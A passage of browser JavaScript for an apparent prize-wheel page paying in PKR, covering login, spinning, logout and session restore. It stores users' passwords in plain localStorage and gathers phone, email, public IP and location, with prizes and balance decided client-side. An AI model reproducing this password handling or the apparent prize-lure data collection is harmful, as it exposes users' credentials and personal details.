      if (result?.id != null) localStorage.setItem(VISITOR_KEY, String(result.id));

      const local = getLocalAccount(phone);
      if (local) {
        activateLocalAccount(
          {
            ...local,
            fullName: result.fullName || data.fullName,
            email: result.email || data.email,
            phoneNumber: phone,
            balance: typeof result.balance === "number" ? result.balance : local.balance,
            visitorId: result.id,
          },
          password
        );
      } else {
        savePassword(password);
        saveLocation(null);
        saveProfile({
          fullName: result.fullName || data.fullName,
          email: result.email || data.email,
          phoneNumber: phone,
          city: null,
          country: null,
        });
        localStorage.setItem(BALANCE_KEY, String(Math.max(0, Number(result.balance) || 0)));
        localStorage.setItem(SPIN_COUNT_KEY, "0");
        localStorage.setItem(ACTIVITY_KEY, "[]");
        localStorage.setItem(LOGGED_IN_KEY, "1");
        persistActiveAccount();
      }

      if (result?.id != null) localStorage.setItem(VISITOR_KEY, String(result.id));
      persistActiveAccount();
      showSpinView();
    } catch (err) {
      const msg = err.message || "Login failed";
      setFormMessage(msg, true);
      if (/password/i.test(msg)) showFieldError("password", msg);
      else if (/phone|exist/i.test(msg)) showFieldError("phoneNumber", msg);
      loginBtn.disabled = false;
      loginBtn.querySelector(".login-btn-label").textContent = "Continue";
    }
  }

  async function onSpin() {
    if (spinning) return;
    if (!profile && localStorage.getItem(LOGGED_IN_KEY) !== "1") {
      showLoginView();
      return;
    }

    spinning = true;
    spinBtn.disabled = true;
    spinBtnLabel.textContent = "…";
    spinHint.textContent = "Spinning…";
    celebrate.hidden = true;
    withdrawMessageEl.textContent = "";

    try {
      const slice = (Math.PI * 2) / PRIZES.length;
      const prizeIndex = Math.floor(Math.random() * PRIZES.length);
      const extraTurns = 5 + Math.floor(Math.random() * 3);
      const pointerAngle = -Math.PI / 2;
      const prizeCenter = prizeIndex * slice + slice / 2;
      const current = rotation % (Math.PI * 2);
      let delta = pointerAngle - prizeCenter - current;
      while (delta < Math.PI * 2 * extraTurns) delta += Math.PI * 2;

      await animateSpin(rotation + delta, reduceMotion ? 0 : 4200);

      const prize = prizeAtPointer();
      if (prize.amount > 0) addToBalance(prize.amount);
      else setBalance(getBalance());

      // Track after balance update so API stores the latest balance with full visitor row.
      trackSpinInBackground();

      setSpinCount(getSpinCount() + 1);
      pushActivity(prize.amount);
      showCelebration(prize);
      applySpinAvailability();
      spinHint.textContent = `Landed on ${prize.amount} PKR · ${getSpinCount()} total spins`;
    } catch (err) {
      spinHint.textContent = err.message || "Spin failed";
      applySpinAvailability();
    } finally {
      spinning = false;
    }
  }

  function onLogout() {
    persistActiveAccount();
    localStorage.removeItem(LOGGED_IN_KEY);
    localStorage.removeItem(PROFILE_KEY);
    localStorage.removeItem(PASSWORD_KEY);
    localStorage.removeItem(VISITOR_KEY);
    profile = null;
    form.reset();
    hideLocationModal();
    hideWithdrawModal();
    showLoginView();
    setFormMessage("Logged out. Your account stays linked to your phone on this device.");
  }

  function restoreSession() {
    profile = loadProfile();
    locationInfo = loadLocation();
    const loggedIn = localStorage.getItem(LOGGED_IN_KEY) === "1" && profile;
    if (loggedIn) showSpinView();
    else {
      localStorage.removeItem(LOGGED_IN_KEY);
      showLoginView();
    }
  }

  document.addEventListener("DOMContentLoaded", () => {
    restoreSession();
    ensurePublicIp();
    form.addEventListener("submit", onLogin);
    spinBtn.addEventListener("click", onSpin);
    logoutBtn.addEventListener("click", onLogout);
    withdrawBtn.addEventListener("click", onWithdraw);
    withdrawCloseBtn.addEventListener("click", () => {
      pendingWithdraw = false;
      hideWithdrawModal();
    });
    withdrawSendBtn.addEventListener("click", onWithdrawSend);
    celebrateClose.addEventListener("click", hideCelebration);
    locationAllowBtn.addEventListener("click", () => requestLocationFromModal());
  });
})();
